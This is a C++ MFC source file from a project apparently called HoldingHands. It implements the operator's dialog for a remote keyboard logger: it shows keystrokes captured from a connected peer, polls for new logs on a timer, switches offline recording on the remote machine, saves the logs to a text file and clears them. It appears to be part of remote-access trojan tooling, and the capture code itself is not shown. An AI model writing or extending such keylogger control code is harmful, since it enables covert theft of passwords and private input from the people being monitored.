// KeybdLogDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "HoldingHands.h"
#include "KeybdLogDlg.h"
#include "afxdialogex.h"
#include "KeybdLogSrv.h"

// CKeybdLogDlg 对话框

IMPLEMENT_DYNAMIC(CKeybdLogDlg, CDialogEx)

CKeybdLogDlg::CKeybdLogDlg(CKeybdLogSrv*pHandler, CWnd* pParent /*=NULL*/)
	: CDialogEx(CKeybdLogDlg::IDD, pParent)
	, m_Interval(30)
{
	m_pHandler = pHandler;
	m_dwTimerId = 0;
}

CKeybdLogDlg::~CKeybdLogDlg()
{
}

void CKeybdLogDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT1, m_Log);
	DDX_Text(pDX, IDC_EDIT2, m_Interval);
	DDX_Control(pDX, IDC_CHECK1, m_OfflineRecord);
}


BEGIN_MESSAGE_MAP(CKeybdLogDlg, CDialogEx)
	ON_WM_CLOSE()
	ON_MESSAGE(WM_KEYBD_LOG_DATA,OnLogData)
	ON_MESSAGE(WM_KEYBD_LOG_ERROR, OnError)
	ON_MESSAGE(WM_KEYBD_LOG_INIT,OnLogInit)
	ON_BN_CLICKED(IDOK2, &CKeybdLogDlg::OnBnClickedOk2)
	ON_BN_CLICKED(IDOK, &CKeybdLogDlg::OnBnClickedOk)
	ON_EN_CHANGE(IDC_EDIT2, &CKeybdLogDlg::OnEnChangeEdit2)
	ON_WM_TIMER()
	ON_BN_CLICKED(IDC_CHECK1, &CKeybdLogDlg::OnBnClickedCheck1)
	ON_BN_CLICKED(IDC_BUTTON1, &CKeybdLogDlg::OnBnClickedButton1)
END_MESSAGE_MAP()


// CKeybdLogDlg 消息处理程序


void CKeybdLogDlg::OnClose()
{
	if (m_pHandler){
		m_pHandler->Close();
		m_pHandler = NULL;
	}
}


BOOL CKeybdLogDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// TODO:  在此添加额外的初始化
	auto const peer = m_pHandler->GetPeerName();
	//设置窗口标题.
	CString Title;
	Title.Format(L"[%s] Keyboard Logger", CA2W(peer.first.c_str()).m_psz);
	SetWindowText(Title);
	//
	m_OfflineRecord.EnableWindow(FALSE);
	GetDlgItem(IDC_EDIT2)->EnableWindow(FALSE);
	GetDlgItem(IDOK2)->EnableWindow(FALSE);
	GetDlgItem(IDOK)->EnableWindow(FALSE);

	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常:  OCX 属性页应返回 FALSE
}

LRESULT CKeybdLogDlg::OnLogData(WPARAM wParam, LPARAM lParam)
{
	char*szLog = (char*)wParam;
	BOOL Append = lParam;
	if (!Append){
		//清空。
		m_Log.SetWindowTextW(TEXT(""));
	}
	m_Log.SetSel(-1);
	m_Log.ReplaceSel(CA2W(szLog).m_psz);
	return 0;
}


//保存日志
void CKeybdLogDlg::OnBnClickedOk2()
{
	CFileDialog FileDlg(FALSE, L"*.txt", L"KeyLog.txt",
		OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT, L"txt file(*.txt)|*.txt", this);
	if (IDOK == FileDlg.DoModal()){
		HANDLE hFile = CreateFile(FileDlg.GetPathName(), GENERIC_WRITE, NULL,
			NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile != INVALID_HANDLE_VALUE){
			DWORD dwWrite = 0;
			CString strLog;
			CStringA aLog;

			m_Log.GetWindowTextW(strLog);
			aLog = strLog;

			WriteFile(hFile, aLog.GetBuffer(), aLog.GetLength(), &dwWrite, NULL);
			CloseHandle(hFile);
			MessageBox(L"Save Log success!");
		}
		else
			MessageBox(L"Couldn't Write File!");
	}
}


//获取记录
void CKeybdLogDlg::OnBnClickedOk()
{
	m_pHandler->GetLogData();
}


void CKeybdLogDlg::OnCancel()
{
}


void CKeybdLogDlg::OnEnChangeEdit2()
{
	//重新设置时钟周期
	UpdateData();
	if (m_Interval == 0){
		return;
	}

	if (m_dwTimerId == 0x10086){
		KillTimer(m_dwTimerId);
		m_dwTimerId = 0;
		m_dwTimerId = SetTimer(0x10086, m_Interval * 1000, NULL);
	}
}


void CKeybdLogDlg::OnTimer(UINT_PTR nIDEvent)
{
	//
	if (m_pHandler){
		m_pHandler->GetLogData();
	}

	CDialogEx::OnTimer(nIDEvent);
}

LRESULT	CKeybdLogDlg::OnError(WPARAM wParam, LPARAM lParam)
{
	wchar_t*szError = (wchar_t*)wParam;
	MessageBox(szError, L"Error");
	return 0;
}

LRESULT CKeybdLogDlg::OnLogInit(WPARAM wParam, LPARAM lParam)
{
	//设置 off line record 标记
	m_OfflineRecord.SetCheck(wParam);

	m_OfflineRecord.EnableWindow();
	GetDlgItem(IDC_EDIT2)->EnableWindow();
	GetDlgItem(IDOK2)->EnableWindow();
	GetDlgItem(IDOK)->EnableWindow();

	m_pHandler->GetLogData();
	//开始定时获取数据.
	m_dwTimerId = SetTimer(0x10086, m_Interval * 1000, NULL);
	return 0;
}

void CKeybdLogDlg::OnBnClickedCheck1()
{
	//
	m_pHandler->SetOfflineRecord(m_OfflineRecord.GetCheck());
}




void CKeybdLogDlg::OnBnClickedButton1()
{
	m_Log.SetWindowTextW(TEXT(""));
	m_pHandler->CleanLog();
}
